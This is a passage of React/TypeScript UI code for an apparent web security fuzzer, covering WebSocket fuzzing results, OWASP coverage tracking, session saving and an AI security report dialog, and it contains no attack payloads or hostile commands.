                              max_messages_per_test: wsConfig.maxMessagesPerTest,
                            }),
                          });
                          const reader = response.body?.getReader();
                          const decoder = new TextDecoder();
                          if (reader) {
                            while (true) {
                              const { done, value } = await reader.read();
                              if (done) break;
                              const text = decoder.decode(value);
                              const lines = text.split("\n").filter(l => l.startsWith("data: "));
                              for (const line of lines) {
                                try {
                                  const data = JSON.parse(line.slice(6));
                                  if (data.type === "start") {
                                    setWsProgress({ current: 0, total: data.total });
                                  } else if (data.type === "progress") {
                                    setWsProgress({ current: data.current, total: data.total });
                                    if (data.result) {
                                      setWsResults(prev => [...prev, data.result]);
                                    }
                                  } else if (data.type === "complete") {
                                    setWsStats(data.stats);
                                    setWsFindings(data.findings || []);
                                  }
                                } catch (e) {}
                              }
                            }
                          }
                        } catch (err) {
                          console.error("WebSocket fuzzing failed:", err);
                        } finally {
                          setWsIsRunning(false);
                        }
                      }}
                      disabled={wsIsRunning || !wsConfig.targetUrl}
                      sx={{
                        background: "linear-gradient(135deg, #06b6d4 0%, #0891b2 100%)",
                        "&:hover": { background: "linear-gradient(135deg, #0891b2 0%, #0e7490 100%)" },
                      }}
                    >
                      {wsIsRunning ? "Fuzzing..." : "Start WebSocket Fuzzing"}
                    </Button>
                  </Box>
                  
                  {/* Progress */}
                  {wsIsRunning && (
                    <Box sx={{ mt: 2 }}>
                      <Typography variant="caption" color="text.secondary">
                        Progress: {wsProgress.current} / {wsProgress.total}
                      </Typography>
                      <LinearProgress 
                        variant="determinate" 
                        value={(wsProgress.current / Math.max(wsProgress.total, 1)) * 100} 
                        sx={{ mt: 0.5, borderRadius: 2 }}
                      />
                    </Box>
                  )}
                </CardContent>
              </Card>
            </Grid>
            
            {/* Results Panel */}
            <Grid item xs={12} lg={7}>
              {/* Stats */}
              {wsStats && (
                <Paper sx={{ p: 2, mb: 2, background: `linear-gradient(135deg, ${alpha("#06b6d4", 0.05)} 0%, ${alpha("#8b5cf6", 0.05)} 100%)` }}>
                  <Grid container spacing={2}>
                    <Grid item xs={6} sm={3}>
                      <Box sx={{ textAlign: "center" }}>
                        <Typography variant="h4" fontWeight={700} color="primary">{wsStats.total_tests}</Typography>
                        <Typography variant="caption" color="text.secondary">Total Tests</Typography>
                      </Box>
                    </Grid>
                    <Grid item xs={6} sm={3}>
                      <Box sx={{ textAlign: "center" }}>
                        <Typography variant="h4" fontWeight={700} color="success.main">{wsStats.successful_connections}</Typography>
                        <Typography variant="caption" color="text.secondary">Connected</Typography>
                      </Box>
                    </Grid>
                    <Grid item xs={6} sm={3}>
                      <Box sx={{ textAlign: "center" }}>
                        <Typography variant="h4" fontWeight={700} color="warning.main">{wsStats.interesting_count}</Typography>
                        <Typography variant="caption" color="text.secondary">Interesting</Typography>
                      </Box>
                    </Grid>
                    <Grid item xs={6} sm={3}>
                      <Box sx={{ textAlign: "center" }}>
                        <Typography variant="h4" fontWeight={700} color="error.main">{wsStats.vulnerabilities_found}</Typography>
                        <Typography variant="caption" color="text.secondary">Vulnerabilities</Typography>
                      </Box>
                    </Grid>
                  </Grid>
                </Paper>
              )}
              
              {/* Findings */}
              {wsFindings.length > 0 && (
                <Card sx={{ mb: 2, border: `1px solid ${alpha("#ef4444", 0.3)}` }}>
                  <CardContent>
                    <Typography variant="h6" fontWeight={600} color="error.main" sx={{ mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                      <WarningIcon /> Vulnerabilities Found ({wsFindings.length})
                    </Typography>
                    {wsFindings.map((finding, i) => (
                      <Paper key={i} sx={{ p: 2, mb: 1, bgcolor: alpha("#ef4444", 0.05) }}>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                          <Chip 
                            label={finding.severity} 
                            size="small" 
                            color={finding.severity === "critical" ? "error" : finding.severity === "high" ? "error" : "warning"} 
                          />
                          <Typography variant="subtitle2" fontWeight={600}>{finding.type}</Typography>
                        </Box>
                        <Typography variant="body2" sx={{ mb: 1 }}>{finding.description}</Typography>
                        <Typography variant="caption" sx={{ fontFamily: "monospace", display: "block", bgcolor: "rgba(0,0,0,0.1)", p: 0.5, borderRadius: 1 }}>
                          Payload: {finding.payload}
                        </Typography>
                        {finding.recommendation && (
                          <Typography variant="caption" color="info.main" sx={{ display: "block", mt: 1 }}>
                            💡 {finding.recommendation}
                          </Typography>
                        )}
                      </Paper>
                    ))}
                  </CardContent>
                </Card>
              )}
              
              {/* Results Table */}
              <Card>
                <CardContent>
                  <Typography variant="h6" fontWeight={600} sx={{ mb: 2 }}>
                    Test Results ({wsResults.length})
                  </Typography>
                  <TableContainer sx={{ maxHeight: 500 }}>
                    <Table stickyHeader size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ fontWeight: 600 }}>Category</TableCell>
                          <TableCell sx={{ fontWeight: 600 }}>Test</TableCell>
                          <TableCell sx={{ fontWeight: 600 }}>State</TableCell>
                          <TableCell sx={{ fontWeight: 600 }}>Duration</TableCell>
                          <TableCell sx={{ fontWeight: 600 }}>Flags</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {wsResults.slice(0, 200).map((result, i) => (
                          <TableRow 
                            key={result.id || i} 
                            hover
                            sx={{ 
                              bgcolor: result.vulnerability_detected 
                                ? alpha("#ef4444", 0.1) 
                                : result.interesting 
                                  ? alpha("#f59e0b", 0.05) 
                                  : "inherit" 
                            }}
                          >
                            <TableCell>
                              <Chip label={result.category} size="small" variant="outlined" />
                            </TableCell>
                            <TableCell>
                              <Tooltip title={result.payload || ""}>
                                <Typography variant="body2" sx={{ maxWidth: 200, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                                  {result.test_name}
                                </Typography>
                              </Tooltip>
                            </TableCell>
                            <TableCell>
                              <Chip 
                                label={result.connection_state} 
                                size="small" 
                                color={result.connection_state === "connected" ? "success" : result.connection_state === "error" ? "error" : "default"}
                              />
                            </TableCell>
                            <TableCell>{result.duration_ms}ms</TableCell>
                            <TableCell>
                              {result.flags?.map((flag: string, fi: number) => (
                                <Chip key={fi} label={flag} size="small" color="warning" variant="outlined" sx={{ mr: 0.5, mb: 0.5, fontSize: "0.7rem" }} />
                              ))}
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                  {wsResults.length === 0 && !wsIsRunning && (
                    <Box sx={{ textAlign: "center", py: 4 }}>
                      <CableIcon sx={{ fontSize: 48, color: "text.disabled", mb: 1 }} />
                      <Typography color="text.secondary">
                        Configure your WebSocket target and start fuzzing to see results
                      </Typography>
                    </Box>
                  )}
                </CardContent>
              </Card>
            </Grid>
          </Grid>
        </Box>
      )}

      {/* Tab 9: Coverage Tracking */}
      {activeTab === 9 && (
        <Box>
          <Grid container spacing={3}>
            {/* Coverage Overview */}
            <Grid item xs={12} lg={4}>
              <Card sx={{ background: `linear-gradient(135deg, ${alpha("#8b5cf6", 0.05)} 0%, ${alpha("#6366f1", 0.05)} 100%)` }}>
                <CardContent>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 3 }}>
                    <RadarIcon color="secondary" sx={{ fontSize: 28 }} />
                    <Typography variant="h6" fontWeight={700}>Coverage Tracking</Typography>
                  </Box>
                  
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 3 }}>
                    Track your security testing coverage across techniques, OWASP Top 10 categories, 
                    and endpoints. Identify gaps and get recommendations for comprehensive testing.
                  </Typography>
                  
                  {/* Create New Session */}
                  <Box sx={{ mb: 3 }}>
                    <Typography variant="subtitle2" fontWeight={600} gutterBottom>Create Coverage Session</Typography>
                    <Box sx={{ display: "flex", gap: 1 }}>
                      <TextField
                        fullWidth
                        size="small"
                        placeholder="Target base URL (e.g., https://api.example.com)"
                        value={coverageNewSessionUrl}
                        onChange={(e) => setCoverageNewSessionUrl(e.target.value)}
                      />
                      <Button
                        variant="contained"
                        onClick={async () => {
                          if (!coverageNewSessionUrl) return;
                          setCoverageLoading(true);
                          try {
                            const res = await fetch("/api/fuzzer/coverage/sessions", {
                              method: "POST",
                              headers: { "Content-Type": "application/json" },
                              body: JSON.stringify({ target_base_url: coverageNewSessionUrl }),
                            });
                            const session = await res.json();
                            setActiveCoverageSession(session);
                            setCoverageSessions(prev => [...prev, session]);
                            setCoverageNewSessionUrl("");
                          } catch (err) {
                            console.error("Failed to create coverage session:", err);
                          } finally {
                            setCoverageLoading(false);
                          }
                        }}
                        disabled={coverageLoading || !coverageNewSessionUrl}
                      >
                        Create
                      </Button>
                    </Box>
                  </Box>
                  
                  {/* Load Existing Sessions */}
                  <Box sx={{ mb: 3 }}>
                    <Typography variant="subtitle2" fontWeight={600} gutterBottom>
                      Coverage Sessions
                    </Typography>
                    <Button
                      variant="outlined"
                      size="small"
                      fullWidth
                      startIcon={coverageLoading ? <CircularProgress size={16} /> : <RefreshIcon />}
                      onClick={async () => {
                        setCoverageLoading(true);
                        try {
                          const res = await fetch("/api/fuzzer/coverage/sessions");
                          const data = await res.json();
                          setCoverageSessions(data.sessions || []);
                        } catch (err) {
                          console.error("Failed to load coverage sessions:", err);
                        } finally {
                          setCoverageLoading(false);
                        }
                      }}
                      sx={{ mb: 1 }}
                    >
                      Load Sessions
                    </Button>
                    {coverageSessions.length > 0 && (
                      <Paper variant="outlined" sx={{ p: 1, maxHeight: 200, overflow: "auto" }}>
                        {coverageSessions.map((session) => (
                          <Box
                            key={session.session_id}
                            onClick={() => setActiveCoverageSession(session)}
                            sx={{
                              p: 1,
                              borderRadius: 1,
                              cursor: "pointer",
                              bgcolor: activeCoverageSession?.session_id === session.session_id ? alpha("#8b5cf6", 0.1) : "transparent",
                              "&:hover": { bgcolor: alpha("#8b5cf6", 0.05) },
                              mb: 0.5,
                            }}
                          >
                            <Typography variant="body2" fontWeight={500}>
                              {session.target_base_url}
                            </Typography>
                            <Box sx={{ display: "flex", gap: 1, mt: 0.5 }}>
                              <Chip label={`${session.coverage_percent || 0}%`} size="small" color="primary" />
                              <Chip label={`${session.total_findings || 0} findings`} size="small" color="error" variant="outlined" />
                            </Box>
                          </Box>
                        ))}
                      </Paper>
                    )}
                  </Box>
                  
                  {/* Load Techniques */}
                  <Button
                    variant="outlined"
                    fullWidth
                    startIcon={<CategoryIcon />}
                    onClick={async () => {
                      try {
                        const [techRes, owaspRes] = await Promise.all([
                          fetch("/api/fuzzer/coverage/techniques"),
                          fetch("/api/fuzzer/coverage/owasp"),
                        ]);
                        const techniques = await techRes.json();
                        const owasp = await owaspRes.json();
                        setCoverageTechniques(techniques.techniques || []);
                        setOwaspCategories(owasp);
                      } catch (err) {
                        console.error("Failed to load techniques:", err);
                      }
                    }}
                    sx={{ mb: 2 }}
                  >
                    Load Technique Registry
                  </Button>
                  
                  {/* Active Session Stats */}
                  {activeCoverageSession && (
                    <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle2" fontWeight={600} gutterBottom>
                        Active Session
                      </Typography>
                      <Typography variant="caption" sx={{ display: "block", fontFamily: "monospace", mb: 1 }}>
                        {activeCoverageSession.target_base_url}
                      </Typography>
                      <Grid container spacing={1}>
                        <Grid item xs={6}>
                          <Typography variant="h4" fontWeight={700} color="secondary">
                            {activeCoverageSession.overall_stats?.coverage_percent || 0}%
                          </Typography>
                          <Typography variant="caption" color="text.secondary">Coverage</Typography>
                        </Grid>
                        <Grid item xs={6}>
                          <Typography variant="h4" fontWeight={700} color="error.main">
                            {activeCoverageSession.overall_stats?.total_findings || 0}
                          </Typography>
                          <Typography variant="caption" color="text.secondary">Findings</Typography>
                        </Grid>
                      </Grid>
                      
                      <Box sx={{ mt: 2, display: "flex", gap: 1, flexWrap: "wrap" }}>
                        <Button
                          size="small"
                          variant="outlined"
                          startIcon={<SearchIcon />}
                          onClick={async () => {
                            try {
                              const res = await fetch(`/api/fuzzer/coverage/sessions/${activeCoverageSession.session_id}/gaps`);
                              const gaps = await res.json();
                              setCoverageGaps(gaps);
                            } catch (err) {
                              console.error("Failed to load gaps:", err);
                            }
                          }}
                        >
                          Analyze Gaps
                        </Button>
                        <Button
                          size="small"
                          variant="outlined"
                          startIcon={<GridOnIcon />}
                          onClick={async () => {
                            try {
                              const res = await fetch(`/api/fuzzer/coverage/sessions/${activeCoverageSession.session_id}/heatmap`);
                              const heatmap = await res.json();
                              setCoverageHeatmap(heatmap);
                            } catch (err) {
                              console.error("Failed to load heatmap:", err);
                            }
                          }}
                        >
                          View Heatmap
                        </Button>
                        <Button
                          size="small"
                          variant="outlined"
                          startIcon={<DownloadIcon />}
                          onClick={async () => {
                            try {
                              const res = await fetch(`/api/fuzzer/coverage/sessions/${activeCoverageSession.session_id}/report?format=markdown`);
                              const report = await res.text();
                              setCoverageReportContent(report);
                              setShowCoverageReport(true);
                            } catch (err) {
                              console.error("Failed to generate report:", err);
                            }
                          }}
                        >
                          Report
                        </Button>
                      </Box>
                    </Paper>
                  )}
                </CardContent>
              </Card>
            </Grid>
            
            {/* Coverage Details */}
            <Grid item xs={12} lg={8}>
              {/* OWASP Coverage */}
              {Object.keys(owaspCategories).length > 0 && (
                <Card sx={{ mb: 2 }}>
                  <CardContent>
                    <Typography variant="h6" fontWeight={600} sx={{ mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                      <ShieldIcon color="primary" /> OWASP Top 10 Coverage
                    </Typography>
                    <Grid container spacing={1}>
                      {Object.entries(owaspCategories).map(([id, info]: [string, any]) => (
                        <Grid item xs={12} sm={6} key={id}>
                          <Paper
                            sx={{
                              p: 1.5,
                              bgcolor: alpha(info.techniques?.length > 3 ? "#10b981" : "#f59e0b", 0.05),
                              border: `1px solid ${alpha(info.techniques?.length > 3 ? "#10b981" : "#f59e0b", 0.2)}`,
                            }}
                          >
                            <Typography variant="subtitle2" fontWeight={600}>
                              {id}
                            </Typography>
                            <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
                              {info.name}
                            </Typography>
                            <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                              <LinearProgress
                                variant="determinate"
                                value={activeCoverageSession?.owasp_coverage?.[id]?.coverage_percent || 0}
                                sx={{ flex: 1, borderRadius: 1 }}
                              />
                              <Typography variant="caption" fontWeight={600}>
                                {activeCoverageSession?.owasp_coverage?.[id]?.coverage_percent || 0}%
                              </Typography>
                            </Box>
                            <Typography variant="caption" color="text.secondary">
                              {info.techniques?.length || 0} techniques
                            </Typography>
                          </Paper>
                        </Grid>
                      ))}
                    </Grid>
                  </CardContent>
                </Card>
              )}
              
              {/* Coverage Gaps */}
              {coverageGaps && (
                <Card sx={{ mb: 2, border: `1px solid ${alpha("#f59e0b", 0.3)}` }}>
                  <CardContent>
                    <Typography variant="h6" fontWeight={600} sx={{ mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                      <WarningIcon color="warning" /> Coverage Gaps
                    </Typography>
                    
                    {/* Recommendations */}
                    {coverageGaps.recommendations?.length > 0 && (
                      <Box sx={{ mb: 2 }}>
                        <Typography variant="subtitle2" fontWeight={600} gutterBottom>Recommendations</Typography>
                        {coverageGaps.recommendations.map((rec: any, i: number) => (
                          <Alert 
                            key={i} 
                            severity={rec.priority === "critical" ? "error" : rec.priority === "high" ? "warning" : "info"}
                            sx={{ mb: 1 }}
                          >
                            {rec.message}
                          </Alert>
                        ))}
                      </Box>
                    )}
                    
                    {/* Untested Techniques */}
                    {coverageGaps.untested_techniques?.length > 0 && (
                      <Box>
                        <Typography variant="subtitle2" fontWeight={600} gutterBottom>
                          Untested Techniques ({coverageGaps.untested_techniques.length})
                        </Typography>
                        <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                          {coverageGaps.untested_techniques.slice(0, 20).map((tech: any) => (
                            <Chip
                              key={tech.id}
                              label={tech.name}
                              size="small"
                              color={tech.severity === "critical" ? "error" : tech.severity === "high" ? "warning" : "default"}
                              variant="outlined"
                            />
                          ))}
                        </Box>
                      </Box>
                    )}
                  </CardContent>
                </Card>
              )}
              
              {/* Techniques Registry */}
              {coverageTechniques.length > 0 && (
                <Card>
                  <CardContent>
                    <Typography variant="h6" fontWeight={600} sx={{ mb: 2 }}>
                      Security Testing Techniques ({coverageTechniques.length})
                    </Typography>
                    <TableContainer sx={{ maxHeight: 400 }}>
                      <Table stickyHeader size="small">
                        <TableHead>
                          <TableRow>
                            <TableCell sx={{ fontWeight: 600 }}>Technique</TableCell>
                            <TableCell sx={{ fontWeight: 600 }}>Category</TableCell>
                            <TableCell sx={{ fontWeight: 600 }}>OWASP</TableCell>
                            <TableCell sx={{ fontWeight: 600 }}>Severity</TableCell>
                            <TableCell sx={{ fontWeight: 600 }}>Est. Time</TableCell>
                          </TableRow>
                        </TableHead>
                        <TableBody>
                          {coverageTechniques.map((tech) => (
                            <TableRow key={tech.id} hover>
                              <TableCell>
                                <Typography variant="body2" fontWeight={500}>{tech.name}</Typography>
                                <Typography variant="caption" color="text.secondary">{tech.description}</Typography>
                              </TableCell>
                              <TableCell>
                                <Chip label={tech.category} size="small" variant="outlined" />
                              </TableCell>
                              <TableCell>
                                <Chip label={tech.owasp_category} size="small" color="primary" variant="outlined" />
                              </TableCell>
                              <TableCell>
                                <Chip
                                  label={tech.severity}
                                  size="small"
                                  color={tech.severity === "critical" ? "error" : tech.severity === "high" ? "warning" : "default"}
                                />
                              </TableCell>
                              <TableCell>{tech.estimated_time}s</TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </TableContainer>
                  </CardContent>
                </Card>
              )}
              
              {/* Empty State */}
              {!activeCoverageSession && coverageTechniques.length === 0 && (
                <Card sx={{ textAlign: "center", py: 6 }}>
                  <CardContent>
                    <RadarIcon sx={{ fontSize: 64, color: "text.disabled", mb: 2 }} />
                    <Typography variant="h6" color="text.secondary" gutterBottom>
                      No Coverage Data
                    </Typography>
                    <Typography variant="body2" color="text.disabled">
                      Create a coverage session or load the technique registry to track your security testing coverage.
                    </Typography>
                  </CardContent>
                </Card>
              )}
            </Grid>
          </Grid>
        </Box>
      )}

      {/* Coverage Report Dialog */}
      <Dialog
        open={showCoverageReport}
        onClose={() => setShowCoverageReport(false)}
        maxWidth="lg"
        fullWidth
      >
        <DialogTitle>
          <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
            <RadarIcon color="secondary" />
            Coverage Report
          </Box>
        </DialogTitle>
        <DialogContent dividers>
          <Paper sx={{ p: 2, bgcolor: "#1e1e1e", borderRadius: 2 }}>
            <Typography
              component="pre"
              sx={{
                fontFamily: "monospace",
                fontSize: "0.85rem",
                color: "#d4d4d4",
                whiteSpace: "pre-wrap",
                m: 0,
              }}
            >
              {coverageReportContent}
            </Typography>
          </Paper>
        </DialogContent>
        <DialogActions>
          <Button
            startIcon={<ContentCopyIcon />}
            onClick={() => navigator.clipboard.writeText(coverageReportContent)}
          >
            Copy
          </Button>
          <Button
            startIcon={<DownloadIcon />}
            onClick={() => {
              const blob = new Blob([coverageReportContent], { type: "text/markdown" });
              saveAs(blob, `coverage-report-${Date.now()}.md`);
            }}
          >
            Download
          </Button>
          <Button onClick={() => setShowCoverageReport(false)} variant="contained">
            Close
          </Button>
        </DialogActions>
      </Dialog>

      {/* Save Session Dialog */}
      <Dialog 
        open={saveSessionDialog} 
        onClose={() => setSaveSessionDialog(false)} 
        maxWidth="sm" 
        fullWidth
        PaperProps={{ sx: { borderRadius: 3 } }}
      >
        <DialogTitle sx={{ pb: 1 }}>
          <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
            <SaveIcon color="primary" />
            <Typography variant="h6" fontWeight={600}>Save Fuzzing Session</Typography>
          </Box>
        </DialogTitle>
        <DialogContent>
          <Grid container spacing={2.5} sx={{ mt: 0.5 }}>
            <Grid item xs={12}>
              <TextField
                fullWidth
                label="Session Name"
                value={sessionName}
                onChange={(e) => setSessionName(e.target.value)}
                placeholder="e.g., SQL Injection Test - Login Form"
                required
                InputProps={{
                  startAdornment: <FolderIcon sx={{ mr: 1, color: "text.secondary" }} />,
                }}
              />
            </Grid>
            <Grid item xs={12}>
              <TextField
                fullWidth
                multiline
                rows={3}
                label="Description (optional)"
                value={sessionDescription}
                onChange={(e) => setSessionDescription(e.target.value)}
                placeholder="Describe what you were testing, target endpoints, expected vulnerabilities..."
              />
            </Grid>
            <Grid item xs={12}>
              <Typography variant="subtitle2" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                <CategoryIcon fontSize="small" />
                Tags
              </Typography>
              <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5, mb: 1.5, minHeight: 32 }}>
                {sessionTags.length === 0 ? (
                  <Typography variant="caption" color="text.disabled">No tags added yet</Typography>
                ) : sessionTags.map((tag, i) => (
                  <Chip
                    key={i}
                    label={tag}
                    size="small"
                    color="primary"
                    variant="outlined"
                    onDelete={() => setSessionTags(tags => tags.filter((_, idx) => idx !== i))}
                  />
                ))}
              </Box>
              <TextField
                size="small"
                fullWidth
                placeholder="Type a tag and press Enter..."
                value={newTag}
                onChange={(e) => setNewTag(e.target.value)}
                onKeyPress={(e) => {
                  if (e.key === "Enter" && newTag.trim()) {
                    e.preventDefault();
                    setSessionTags(tags => [...tags, newTag.trim()]);
                    setNewTag("");
                  }
                }}
                InputProps={{
                  endAdornment: (
                    <IconButton 
                      size="small"
                      onClick={() => {
                        if (newTag.trim()) {
                          setSessionTags(tags => [...tags, newTag.trim()]);
                          setNewTag("");
                        }
                      }}
                    >
                      <AddIcon fontSize="small" />
                    </IconButton>
                  ),
                }}
              />
            </Grid>
            <Grid item xs={12}>
              <Paper sx={{ p: 2, bgcolor: alpha(theme.palette.info.main, 0.05), borderRadius: 2 }}>
                <Typography variant="subtitle2" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <InfoIcon color="info" fontSize="small" />
                  Session Summary
                </Typography>
                <Grid container spacing={1}>
                  <Grid item xs={6}>
                    <Typography variant="caption" color="text.secondary">Target URL</Typography>
                    <Typography variant="body2" sx={{ fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                      {config.targetUrl || "Not set"}
                    </Typography>
                  </Grid>
                  <Grid item xs={6}>
                    <Typography variant="caption" color="text.secondary">Results to Save</Typography>
                    <Typography variant="body2" fontWeight={600}>{results.length} responses</Typography>
                  </Grid>
                </Grid>
              </Paper>
            </Grid>
          </Grid>
        </DialogContent>
        <DialogActions sx={{ px: 3, pb: 2 }}>
          <Button onClick={() => setSaveSessionDialog(false)} variant="outlined">Cancel</Button>
          <Button 
            variant="contained" 
            onClick={saveAsSession}
            disabled={!sessionName.trim()}
          >
            Save Session
          </Button>
        </DialogActions>
      </Dialog>

      {/* Full AI Security Report Dialog */}
      <Dialog
        open={showFullReportDialog}
        onClose={() => setShowFullReportDialog(false)}
        maxWidth="lg"
        fullWidth
        PaperProps={{ sx: { maxHeight: "90vh" } }}
      >
        <DialogTitle sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", bgcolor: alpha("#8b5cf6", 0.05) }}>
          <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
            <AssessmentIcon sx={{ color: "#7c3aed" }} />
            <Typography variant="h6">Full AI Security Analysis Report</Typography>
          </Box>
          {fullAiReport?.summary && (
            <Chip 
              label={`Risk: ${fullAiReport.summary.risk_level.toUpperCase()} (${fullAiReport.summary.risk_score}/100)`}
              color={fullAiReport.summary.risk_level === "critical" ? "error" : fullAiReport.summary.risk_level === "high" ? "error" : fullAiReport.summary.risk_level === "medium" ? "warning" : "success"}
            />
          )}
        </DialogTitle>
        <DialogContent dividers sx={{ p: 0 }}>
          {fullAiReport ? (
            <Box>
              {/* Executive Summary */}
              <Box sx={{ p: 3, bgcolor: alpha("#8b5cf6", 0.03) }}>
                <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  📊 Executive Summary
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={6} sm={3}>
                    <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#3b82f6", 0.1) }}>
                      <Typography variant="h4" fontWeight={700} color="#3b82f6">{fullAiReport.responses_analyzed}</Typography>
                      <Typography variant="caption" color="text.secondary">Responses Analyzed</Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={6} sm={3}>
                    <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#ef4444", 0.1) }}>
                      <Typography variant="h4" fontWeight={700} color="#ef4444">{fullAiReport.summary?.findings_count || 0}</Typography>
                      <Typography variant="caption" color="text.secondary">Vulnerabilities Found</Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={6} sm={3}>
                    <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#f59e0b", 0.1) }}>
                      <Typography variant="h4" fontWeight={700} color="#f59e0b">{fullAiReport.summary?.anomalies_count || 0}</Typography>
                      <Typography variant="caption" color="text.secondary">Anomalies Detected</Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={6} sm={3}>
                    <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#10b981", 0.1) }}>
                      <Typography variant="h4" fontWeight={700} color="#10b981">{fullAiReport.summary?.interesting_count || 0}</Typography>
                      <Typography variant="caption" color="text.secondary">Interesting Responses</Typography>
                    </Paper>
                  </Grid>
                </Grid>
              </Box>

              <Divider />

              {/* Vulnerabilities Section */}
              {fullAiReport.vulnerabilities && fullAiReport.vulnerabilities.total > 0 && (
                <Box sx={{ p: 3 }}>
                  <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1, color: "#dc2626" }}>
                    🔴 Vulnerabilities Detected ({fullAiReport.vulnerabilities.total})
                  </Typography>
                  
                  {/* Severity breakdown */}
                  <Box sx={{ display: "flex", gap: 1, mb: 2, flexWrap: "wrap" }}>
                    {Object.entries(fullAiReport.vulnerabilities.by_severity || {}).map(([severity, count]) => (
                      <Chip 
                        key={severity}
                        label={`${severity}: ${count}`}
                        size="small"
                        color={severity === "critical" || severity === "high" ? "error" : severity === "medium" ? "warning" : "default"}
                      />
                    ))}
                  </Box>

                  {/* Findings list */}
                  {fullAiReport.vulnerabilities.findings.slice(0, 10).map((finding: any, i: number) => (
                    <Accordion key={i} sx={{ mb: 1, bgcolor: alpha(finding.severity === "critical" || finding.severity === "high" ? "#ef4444" : finding.severity === "medium" ? "#f59e0b" : "#3b82f6", 0.03) }}>
                      <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, flex: 1 }}>
                          <Chip 
                            label={finding.severity || "unknown"} 
                            size="small"
                            color={finding.severity === "critical" || finding.severity === "high" ? "error" : finding.severity === "medium" ? "warning" : "info"}
                          />
                          <Typography variant="subtitle2" fontWeight={600}>
                            {finding.vuln_type || finding.type || "Vulnerability"}
                          </Typography>
                          <Typography variant="caption" color="text.secondary" sx={{ ml: "auto", mr: 2 }}>
                            Payload: <code>{finding.payload?.substring(0, 50)}{finding.payload?.length > 50 ? "..." : ""}</code>
                          </Typography>
                        </Box>
                      </AccordionSummary>
                      <AccordionDetails>
                        <Typography variant="body2" sx={{ mb: 2 }}>
                          {finding.description || finding.title}
                        </Typography>
                        
                        {finding.evidence && finding.evidence.length > 0 && (
                          <Box sx={{ mb: 2 }}>
                            <Typography variant="caption" fontWeight={600}>Evidence:</Typography>
                            <Paper sx={{ p: 1.5, bgcolor: "background.default", mt: 0.5 }}>
                              {finding.evidence.map((e: string, j: number) => (
                                <Typography key={j} variant="caption" component="div" sx={{ fontFamily: "monospace", fontSize: "0.75rem" }}>
                                  • {e}
                                </Typography>
                              ))}
                            </Paper>
                          </Box>
                        )}

                        {finding.indicators && finding.indicators.length > 0 && (
                          <Box sx={{ mb: 2 }}>
                            <Typography variant="caption" fontWeight={600}>Indicators:</Typography>
                            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5, mt: 0.5 }}>
                              {finding.indicators.map((ind: string, j: number) => (
                                <Chip key={j} label={ind} size="small" variant="outlined" />
                              ))}
                            </Box>
                          </Box>
                        )}

                        {finding.recommendation && (
                          <Alert severity="info" sx={{ mt: 1 }}>
                            <Typography variant="caption"><strong>Recommendation:</strong> {finding.recommendation}</Typography>
                          </Alert>
                        )}

                        {finding.false_positive_likelihood && (
                          <Typography variant="caption" color="text.secondary" sx={{ mt: 1, display: "block" }}>
                            False Positive Likelihood: {finding.false_positive_likelihood}
                          </Typography>
                        )}
                      </AccordionDetails>
                    </Accordion>
                  ))}
                  
                  {fullAiReport.vulnerabilities.findings.length > 10 && (
                    <Typography variant="body2" color="text.secondary" sx={{ mt: 1 }}>
                      ... and {fullAiReport.vulnerabilities.findings.length - 10} more vulnerabilities
                    </Typography>
                  )}
                </Box>
              )}

              <Divider />

              {/* Anomalies Section */}
              {fullAiReport.anomalies && fullAiReport.anomalies.total > 0 && (
                <Box sx={{ p: 3 }}>
                  <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1, color: "#f59e0b" }}>
                    ⚠️ Anomalies Detected ({fullAiReport.anomalies.total})
                  </Typography>
                  
                  <Box sx={{ display: "flex", gap: 1, mb: 2, flexWrap: "wrap" }}>
                    {Object.entries(fullAiReport.anomalies.by_type || {}).map(([type, count]) => (
                      <Chip key={type} label={`${type}: ${count}`} size="small" color="warning" variant="outlined" />
                    ))}
                  </Box>

                  <TableContainer component={Paper} variant="outlined">
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell>Type</TableCell>
                          <TableCell>Description</TableCell>
                          <TableCell align="right">Score</TableCell>
                          <TableCell align="right">Deviation</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
